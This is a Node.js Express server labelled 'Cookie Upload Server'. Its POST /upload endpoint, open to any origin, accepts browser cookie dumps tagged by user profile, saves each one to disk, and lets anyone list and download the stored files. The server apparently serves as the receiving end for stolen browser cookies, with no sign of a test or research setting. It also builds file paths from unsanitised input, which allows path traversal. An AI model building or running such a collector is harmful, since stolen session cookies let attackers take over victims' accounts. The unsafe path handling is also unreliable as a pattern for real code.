const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir);
}

// Cookie upload endpoint
app.post('/upload', (req, res) => {
  try {
    const cookieData = req.body;
    const timestamp = cookieData.timestamp ? cookieData.timestamp.replace(/[:.]/g, '-') : new Date().toISOString().replace(/[:.]/g, '-');
    const userPrefix = cookieData.userProfile || 'user';
    const filename = `${userPrefix}_cookies_${timestamp}.json`;
    const filepath = path.join(uploadsDir, filename);
    
    // Save cookie data to file
    fs.writeFileSync(filepath, JSON.stringify(cookieData, null, 2));
    
    console.log(`[${new Date().toISOString()}] Received ${cookieData.total_cookies} cookies - Saved to ${filename}`);
    
    res.json({
      success: true,
      message: 'Cookies uploaded successfully',
      filename: filename,
      count: cookieData.total_cookies
    });
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Status endpoint
app.get('/status', (req, res) => {
  const files = fs.readdirSync(uploadsDir);
  res.json({
    status: 'running',
    uploads_count: files.length,
    recent_files: files.slice(-5)
  });
});

// List all uploaded files
app.get('/files', (req, res) => {
  const files = fs.readdirSync(uploadsDir).map(file => {
    const filepath = path.join(uploadsDir, file);
    const stats = fs.statSync(filepath);
    return {
      filename: file,
      size: stats.size,
      created: stats.birthtime,
      modified: stats.mtime
    };
  });
  
  res.json({ files: files.sort((a, b) => b.created - a.created) });
});

// Download specific file
app.get('/download/:filename', (req, res) => {
  const filename = req.params.filename;
  const filepath = path.join(uploadsDir, filename);
  
  if (fs.existsSync(filepath)) {
    res.download(filepath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

app.listen(PORT, () => {
  console.log(`Cookie Upload Server running on http://localhost:${PORT}`);
  console.log(`Upload endpoint: http://localhost:${PORT}/upload`);
  console.log(`Status endpoint: http://localhost:${PORT}/status`);
});